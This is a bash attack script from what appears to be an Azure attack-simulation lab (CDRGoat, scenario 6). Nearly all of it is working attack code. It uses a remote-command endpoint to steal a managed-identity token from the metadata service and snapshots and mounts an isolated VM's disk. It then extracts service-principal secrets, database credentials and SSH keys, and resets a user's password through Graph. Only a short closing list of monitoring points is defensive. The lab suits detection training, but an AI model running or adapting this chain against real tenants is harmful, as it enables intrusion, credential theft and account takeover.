#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Azure - Scenario 6                 ===" "${RESET}"
  printf "%sRCE → Disk Snapshot → Secret Extraction from Private VM%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  • Step 1. Exploit RCE on public VM and steal MI token\n"
  printf "  • Step 2. Enumerate resources and discover private backend VM\n"
  printf "  • Step 3. Snapshot the backend VM's OS disk\n"
  printf "  • Step 4. Create disk from snapshot and attach to public VM\n"
  printf "  • Step 5. Mount disk and extract secrets\n"
  printf "  • Step 6. Use extracted SP credentials for identity compromise\n"
}
banner

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Step 1. Exploit RCE and steal MI token
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploit RCE on public VM and steal MI token  ===" "${RESET}"

step "Target input"
read -r -p "  Public VM IP (e.g., 20.x.x.x): " VM_IP

if [ -z "$VM_IP" ]; then
  err "VM IP is required"
  exit 1
fi

TARGET="http://${VM_IP}:8080"

step "Verifying RCE vulnerability"
spin_start "Testing /cmd endpoint"

set +e
RCE_TEST="$(curl -sS --connect-timeout 10 "${TARGET}/cmd?c=id")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ] || [ -z "$RCE_TEST" ]; then
  err "Cannot reach the target VM"
  exit 1
fi

ok "RCE confirmed: ${RCE_TEST}"

HOSTNAME="$(curl -sS "${TARGET}/cmd?c=hostname")"
info "Hostname: ${YELLOW}${HOSTNAME}${RESET}"

step "Stealing MI token from IMDS via RCE"
spin_start "Requesting ARM management token"

MI_CLIENT_ID_INPUT=""
read -r -p "  MI Client ID (from terraform output mi_client_id): " MI_CLIENT_ID_INPUT

set +e
TOKEN_JSON="$(curl -sS "${TARGET}/cmd?c=curl+-s+-H+'Metadata:true'+'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com%26client_id=${MI_CLIENT_ID_INPUT}'")"
set -e
spin_stop

ARM_TOKEN="$(echo "$TOKEN_JSON" | jq -r '.access_token // empty')"

if [ -z "$ARM_TOKEN" ]; then
  err "Failed to steal ARM token from IMDS"
  echo "$TOKEN_JSON" | head -5
  exit 1
fi

ok "ARM token stolen via RCE → IMDS"

# Parse JWT
TOKEN_PAYLOAD="$(echo "$ARM_TOKEN" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq .)"
MI_OID="$(echo "$TOKEN_PAYLOAD" | jq -r '.oid')"
TENANT_ID="$(echo "$TOKEN_PAYLOAD" | jq -r '.tid')"
SUB_ID="$(echo "$TOKEN_PAYLOAD" | jq -r '.xms_mirid' | cut -d'/' -f3)"

if [ -z "$SUB_ID" ] || [ "$SUB_ID" = "null" ]; then
  # Fallback: discover subscriptions
  SUBS_JSON="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
    "https://management.azure.com/subscriptions?api-version=2022-12-01")"
  SUB_ID="$(echo "$SUBS_JSON" | jq -r '.value[0].subscriptionId')"
fi

info "MI Object ID: ${YELLOW}${MI_OID}${RESET}"
info "Tenant ID:    ${YELLOW}${TENANT_ID}${RESET}"
info "Subscription: ${YELLOW}${SUB_ID}${RESET}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We exploited the RCE vulnerability on the public VM to reach the\n"
printf "Azure Instance Metadata Service (IMDS) at ${YELLOW}169.254.169.254${RESET}.\n\n"
printf "The VM's Managed Identity has ${MAGENTA}Contributor${RESET} on the Resource Group.\n"
printf "Contributor allows managing all resources — including disk operations.\n\n"

read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 2. Enumerate resources
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Enumerate resources and discover backend VM  ===" "${RESET}"

step "Enumerating resources in subscription"
spin_start "Calling ARM resources API"

RESOURCES_JSON="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resources?api-version=2022-12-01")"

spin_stop

RESOURCE_GROUP="$(echo "$RESOURCES_JSON" | jq -r '.value[0].id | split("/")[4]')"
ok "Resource Group: ${YELLOW}${RESOURCE_GROUP}${RESET}"

echo "$RESOURCES_JSON" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.value[] | "  • [\(.type)] \($Y)\(.name)\($R)"'

step "Listing Virtual Machines"
spin_start "Querying VMs in Resource Group"

VMS_JSON="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/virtualMachines?api-version=2023-07-01")"

spin_stop

echo "$VMS_JSON" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.value[] | "  • \($Y)\(.name)\($R) (size: \(.properties.hardwareProfile.vmSize))"'

# Find the backend VM
BACKEND_VM_NAME="$(echo "$VMS_JSON" | jq -r '.value[] | select(.name | contains("backend")) | .name')"
BACKEND_VM_ID="$(echo "$VMS_JSON" | jq -r '.value[] | select(.name | contains("backend")) | .id')"

if [ -z "$BACKEND_VM_NAME" ] || [ "$BACKEND_VM_NAME" = "null" ]; then
  err "Backend VM not found"
  exit 1
fi

ok "Found backend VM: ${YELLOW}${BACKEND_VM_NAME}${RESET}"

step "Checking backend VM network accessibility"

# Get backend VM NIC
BACKEND_NIC_ID="$(echo "$VMS_JSON" | jq -r '.value[] | select(.name | contains("backend")) | .properties.networkProfile.networkInterfaces[0].id')"

BACKEND_NIC="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com${BACKEND_NIC_ID}?api-version=2023-05-01")"

BACKEND_PRIVATE_IP="$(echo "$BACKEND_NIC" | jq -r '.properties.ipConfigurations[0].properties.privateIPAddress')"
BACKEND_PUBLIC_IP="$(echo "$BACKEND_NIC" | jq -r '.properties.ipConfigurations[0].properties.publicIPAddress // empty')"

info "Backend VM private IP: ${YELLOW}${BACKEND_PRIVATE_IP}${RESET}"

if [ -z "$BACKEND_PUBLIC_IP" ]; then
  ok "Backend VM has ${RED}no public IP${RESET} — not directly reachable"
else
  info "Backend VM has a public IP (unexpected)"
fi

step "Attempting to reach backend VM via RCE (network pivot)"
spin_start "Testing connectivity from public VM to ${BACKEND_PRIVATE_IP}"

set +e
PING_RESULT="$(curl -sS --connect-timeout 10 "${TARGET}/cmd?c=curl+-s+-m+5+http://${BACKEND_PRIVATE_IP}:22+||+echo+'Connection+refused/timeout'")"
set -e
spin_stop

info "Result: ${PING_RESULT:0:80}"
ok "Backend VM is ${RED}network-isolated${RESET} — cannot be reached via network"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The backend VM is on a ${YELLOW}private subnet${RESET} with no public IP and\n"
printf "NSG rules that ${RED}deny all inbound traffic${RESET}.\n\n"
printf "Network segmentation would normally stop us here. However...\n"
printf "With ${MAGENTA}Contributor${RESET} we can perform ${RED}disk-level operations${RESET}:\n"
printf "  1. Snapshot the backend VM's OS disk\n"
printf "  2. Create a new managed disk from the snapshot\n"
printf "  3. Attach that disk to our compromised VM\n"
printf "  4. Mount and read the filesystem — bypassing network isolation entirely\n\n"

read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Snapshot the backend VM's OS disk
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Snapshot the backend VM's OS disk  ===" "${RESET}"

step "Getting backend VM's OS disk ID"
spin_start "Querying VM details"

BACKEND_VM_DETAILS="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com${BACKEND_VM_ID}?api-version=2023-07-01")"

OS_DISK_ID="$(echo "$BACKEND_VM_DETAILS" | jq -r '.properties.storageProfile.osDisk.managedDisk.id')"
OS_DISK_NAME="$(echo "$BACKEND_VM_DETAILS" | jq -r '.properties.storageProfile.osDisk.name')"
LOCATION="$(echo "$BACKEND_VM_DETAILS" | jq -r '.location')"

spin_stop

ok "OS Disk: ${YELLOW}${OS_DISK_NAME}${RESET}"
info "Disk ID: ${OS_DISK_ID}"

step "Creating snapshot of backend VM's OS disk"
SNAPSHOT_NAME="attacker-snapshot-$(date +%s)"
spin_start "Creating snapshot (this may take 1-2 minutes)"

set +e
SNAPSHOT_RESP="$(curl -sS -X PUT \
  -H "Authorization: Bearer $ARM_TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/snapshots/${SNAPSHOT_NAME}?api-version=2023-04-02" \
  -d "{
    \"location\": \"${LOCATION}\",
    \"properties\": {
      \"creationData\": {
        \"createOption\": \"Copy\",
        \"sourceResourceId\": \"${OS_DISK_ID}\"
      }
    }
  }")"
set -e
spin_stop

if echo "$SNAPSHOT_RESP" | jq -e '.error' >/dev/null 2>&1; then
  err "Failed to create snapshot"
  echo "$SNAPSHOT_RESP" | jq '.error'
  exit 1
fi

ok "Snapshot creation initiated: ${YELLOW}${SNAPSHOT_NAME}${RESET}"

# Wait for snapshot to complete
step "Waiting for snapshot provisioning"
spin_start "Polling snapshot status"

for i in $(seq 1 30); do
  sleep 10
  SNAP_STATUS="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
    "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/snapshots/${SNAPSHOT_NAME}?api-version=2023-04-02" \
    | jq -r '.properties.provisioningState')"
  if [ "$SNAP_STATUS" = "Succeeded" ]; then break; fi
done

spin_stop

if [ "$SNAP_STATUS" != "Succeeded" ]; then
  err "Snapshot did not complete (status: ${SNAP_STATUS})"
  exit 1
fi

ok "Snapshot ready: ${YELLOW}${SNAPSHOT_NAME}${RESET}"

SNAPSHOT_ID="/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/snapshots/${SNAPSHOT_NAME}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We created a ${RED}disk snapshot${RESET} of the backend VM's OS disk.\n\n"
printf "This is a well-known attack technique used by groups like ${MAGENTA}NOBELIUM${RESET}.\n"
printf "The snapshot is a full copy of the disk, including all files and secrets.\n"
printf "It bypasses network segmentation entirely — no network access needed.\n\n"

read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Create disk and attach to public VM
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Create disk from snapshot and attach to public VM  ===" "${RESET}"

STOLEN_DISK_NAME="attacker-disk-$(date +%s)"

step "Creating managed disk from snapshot"
spin_start "Deploying new managed disk"

set +e
DISK_RESP="$(curl -sS -X PUT \
  -H "Authorization: Bearer $ARM_TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/disks/${STOLEN_DISK_NAME}?api-version=2023-04-02" \
  -d "{
    \"location\": \"${LOCATION}\",
    \"properties\": {
      \"creationData\": {
        \"createOption\": \"Copy\",
        \"sourceResourceId\": \"${SNAPSHOT_ID}\"
      }
    }
  }")"
set -e
spin_stop

ok "Managed disk creation initiated: ${YELLOW}${STOLEN_DISK_NAME}${RESET}"

# Wait for disk
step "Waiting for disk provisioning"
spin_start "Polling disk status"

for i in $(seq 1 20); do
  sleep 10
  DISK_STATUS="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
    "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/disks/${STOLEN_DISK_NAME}?api-version=2023-04-02" \
    | jq -r '.properties.provisioningState')"
  if [ "$DISK_STATUS" = "Succeeded" ]; then break; fi
done

spin_stop
ok "Disk ready: ${YELLOW}${STOLEN_DISK_NAME}${RESET}"

STOLEN_DISK_ID="/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/disks/${STOLEN_DISK_NAME}"

step "Attaching disk to public VM"
spin_start "Updating public VM data disks"

# Get current public VM details
PUBLIC_VM_DETAILS="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/virtualMachines/streamgoat-public-vm?api-version=2023-07-01")"

# Build updated data disks array
set +e
ATTACH_RESP="$(curl -sS -X PATCH \
  -H "Authorization: Bearer $ARM_TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/virtualMachines/streamgoat-public-vm?api-version=2023-07-01" \
  -d "{
    \"properties\": {
      \"storageProfile\": {
        \"dataDisks\": [{
          \"lun\": 1,
          \"name\": \"${STOLEN_DISK_NAME}\",
          \"createOption\": \"Attach\",
          \"managedDisk\": {
            \"id\": \"${STOLEN_DISK_ID}\"
          }
        }]
      }
    }
  }")"
set -e
spin_stop

if echo "$ATTACH_RESP" | jq -e '.error' >/dev/null 2>&1; then
  err "Failed to attach disk"
  echo "$ATTACH_RESP" | jq '.error'
  exit 1
fi

ok "Disk attached to public VM at LUN 1"

# Wait for attachment
sleep 30

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We created a managed disk from the snapshot and attached it to\n"
printf "our compromised VM. The backend VM's filesystem is now accessible\n"
printf "as a ${YELLOW}data disk${RESET} on the public VM — without any network access.\n\n"

read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 5. Mount disk and extract secrets
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Mount stolen disk and extract secrets  ===" "${RESET}"

step "Detecting attached disk device"
spin_start "Listing block devices via RCE"

LSBLK="$(curl -sS "${TARGET}/cmd?c=lsblk+-o+NAME,SIZE,TYPE,MOUNTPOINT")"
spin_stop
info "Block devices:"
echo "$LSBLK"

step "Mounting the stolen disk"
spin_start "Mounting partition"

# Try to find the right partition and mount it
MOUNT_RESULT="$(curl -sS "${TARGET}/cmd?c=sudo+mkdir+-p+/mnt/stolen+%26%26+sudo+mount+/dev/sdc1+/mnt/stolen+2>%261+||+sudo+mount+/dev/sdb1+/mnt/stolen+2>%261+||+echo+'Trying+alternative+devices'")"
spin_stop

info "Mount result: ${MOUNT_RESULT:0:120}"

step "Browsing stolen filesystem"
spin_start "Listing interesting paths"

LS_HOME="$(curl -sS "${TARGET}/cmd?c=ls+-la+/mnt/stolen/home/adminuser/.ssh/+2>/dev/null+||+echo+'Path+not+found'")"
LS_APP="$(curl -sS "${TARGET}/cmd?c=ls+-la+/mnt/stolen/opt/app/+2>/dev/null+||+echo+'Path+not+found'")"

spin_stop

info "SSH directory:"
echo "$LS_HOME"
info "App directory:"
echo "$LS_APP"

step "Extracting secrets from stolen disk"

printf "\n%s%s%s\n" "${BOLD}${RED}" "=== EXFILTRATED SECRETS ===" "${RESET}"

# Extract .env file
printf "\n  %s--- /opt/app/.env ---%s\n" "$YELLOW" "$RESET"
ENV_CONTENT="$(curl -sS "${TARGET}/cmd?c=cat+/mnt/stolen/opt/app/.env+2>/dev/null")"
echo "$ENV_CONTENT"

# Extract config.json
printf "\n  %s--- /opt/app/config.json ---%s\n" "$YELLOW" "$RESET"
CONFIG_CONTENT="$(curl -sS "${TARGET}/cmd?c=cat+/mnt/stolen/opt/app/config.json+2>/dev/null")"
echo "$CONFIG_CONTENT"

# Extract SSH key
printf "\n  %s--- /home/adminuser/.ssh/id_rsa ---%s\n" "$YELLOW" "$RESET"
SSH_KEY="$(curl -sS "${TARGET}/cmd?c=cat+/mnt/stolen/home/adminuser/.ssh/id_rsa+2>/dev/null")"
echo "${SSH_KEY:0:200}..."

# Parse credentials from .env
EXTRACTED_CLIENT_ID="$(echo "$ENV_CONTENT" | grep CLIENT_ID | cut -d= -f2)"
EXTRACTED_SECRET="$(echo "$ENV_CONTENT" | grep CLIENT_SECRET | cut -d= -f2)"
EXTRACTED_TENANT="$(echo "$ENV_CONTENT" | grep TENANT_ID | cut -d= -f2)"

ok "Credentials extracted from stolen disk"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "By mounting the snapshot disk, we extracted:\n"
printf "  • ${RED}Service Principal credentials${RESET} from /opt/app/.env\n"
printf "  • ${RED}Database connection strings${RESET} from /opt/app/config.json\n"
printf "  • ${RED}SSH private keys${RESET} from /home/adminuser/.ssh/\n\n"
printf "Network segmentation was ${RED}completely bypassed${RESET} via disk-level access.\n\n"

read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 6. Use extracted SP for identity compromise
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Use extracted SP credentials for identity compromise  ===" "${RESET}"

step "Authenticating as extracted Service Principal"
spin_start "Requesting Graph token via client_credentials"

set +e
GRAPH_TOKEN_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${EXTRACTED_CLIENT_ID}&client_secret=${EXTRACTED_SECRET}&grant_type=client_credentials&scope=https://graph.microsoft.com/.default" \
  "https://login.microsoftonline.com/${EXTRACTED_TENANT}/oauth2/v2.0/token")"
set -e
spin_stop

GRAPH_TOKEN="$(echo "$GRAPH_TOKEN_RESP" | jq -r '.access_token // empty')"

if [ -z "$GRAPH_TOKEN" ]; then
  err "Failed to authenticate as extracted SP"
  echo "$GRAPH_TOKEN_RESP" | jq '.error_description' 2>/dev/null
  exit 1
fi

ok "Authenticated as backend SP via Graph API"

step "Enumerating target users"
spin_start "Listing streamgoat users"

USERS_JSON="$(curl -sS -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/users?\$filter=startswith(displayName,'StreamGoat')&\$select=id,displayName,userPrincipalName")"

spin_stop

USER_COUNT="$(echo "$USERS_JSON" | jq '.value | length')"
ok "Found ${YELLOW}${USER_COUNT}${RESET} StreamGoat users"

echo "$USERS_JSON" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.value[] | "  • \($Y)\(.displayName)\($R) (\(.userPrincipalName))"'

# Pick the first target user
TARGET_USER_ID="$(echo "$USERS_JSON" | jq -r '.value[0].id')"
TARGET_USER_NAME="$(echo "$USERS_JSON" | jq -r '.value[0].displayName')"
TARGET_USER_UPN="$(echo "$USERS_JSON" | jq -r '.value[0].userPrincipalName')"

info "Target: ${RED}${TARGET_USER_NAME}${RESET} (${TARGET_USER_UPN})"

step "Resetting target user's password"
spin_start "PATCH /users/${TARGET_USER_ID}"

NEW_PASSWORD="Compromised!$(date +%s)"

set +e
RESET_RESP="$(curl -sS -X PATCH \
  -H "Authorization: Bearer $GRAPH_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"passwordProfile\":{\"password\":\"${NEW_PASSWORD}\",\"forceChangePasswordNextSignIn\":false}}" \
  "https://graph.microsoft.com/v1.0/users/${TARGET_USER_ID}")"
set -e
spin_stop

if echo "$RESET_RESP" | jq -e '.error' >/dev/null 2>&1; then
  err "Password reset failed"
  echo "$RESET_RESP" | jq '.error'
else
  ok "Password reset successful for ${RED}${TARGET_USER_NAME}${RESET}"
  info "New password: ${MAGENTA}${NEW_PASSWORD}${RESET}"
fi

################################################################################
# Cleanup
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Cleanup Attack-Created Resources  ===" "${RESET}"

printf "\nThe attack created the following resources:\n"
printf "  • Snapshot: %s%s%s\n" "$YELLOW" "$SNAPSHOT_NAME" "$RESET"
printf "  • Managed Disk: %s%s%s\n" "$YELLOW" "$STOLEN_DISK_NAME" "$RESET"

read -r -p "Do you want to delete attack resources? [y/N]: " CLEANUP_CONFIRM

if [[ "$CLEANUP_CONFIRM" =~ ^[Yy]$ ]]; then
  step "Unmounting stolen disk"
  curl -sS "${TARGET}/cmd?c=sudo+umount+/mnt/stolen+2>/dev/null" >/dev/null || true

  step "Detaching disk from public VM"
  spin_start "Updating VM to remove data disk"
  curl -sS -X PATCH \
    -H "Authorization: Bearer $ARM_TOKEN" \
    -H "Content-Type: application/json" \
    "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/virtualMachines/streamgoat-public-vm?api-version=2023-07-01" \
    -d '{"properties":{"storageProfile":{"dataDisks":[]}}}' >/dev/null
  sleep 30
  spin_stop

  step "Deleting managed disk"
  spin_start "Deleting ${STOLEN_DISK_NAME}"
  curl -sS -X DELETE \
    -H "Authorization: Bearer $ARM_TOKEN" \
    "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/disks/${STOLEN_DISK_NAME}?api-version=2023-04-02" >/dev/null
  sleep 10
  spin_stop
  ok "Disk deleted"

  step "Deleting snapshot"
  spin_start "Deleting ${SNAPSHOT_NAME}"
  curl -sS -X DELETE \
    -H "Authorization: Bearer $ARM_TOKEN" \
    "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/snapshots/${SNAPSHOT_NAME}?api-version=2023-04-02" >/dev/null
  sleep 10
  spin_stop
  ok "Snapshot deleted"

  ok "All attack resources cleaned up"
fi

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Exploited RCE on public VM to steal MI token via IMDS\n"
printf "  2. Enumerated resources — found network-isolated backend VM\n"
printf "  3. Created disk snapshot of backend VM's OS disk\n"
printf "  4. Created new disk from snapshot, attached to public VM\n"
printf "  5. Mounted and extracted secrets (SP creds, DB passwords, SSH keys)\n"
printf "  6. Used extracted SP to reset a user's password (identity compromise)\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Network segmentation completely bypassed via disk snapshot\n"
printf "  • Service Principal credentials stolen from private VM\n"
printf "  • User identity compromised (password reset)\n"
printf "  • Database credentials and SSH keys exfiltrated\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • Disk snapshot creation by VM Managed Identities\n"
printf "  • New disk attachments to running VMs\n"
printf "  • Unusual ARM control-plane activity from compute identities\n"
printf "  • Service Principal authentication from unexpected sources\n"
printf "  • User password resets from application identities\n"
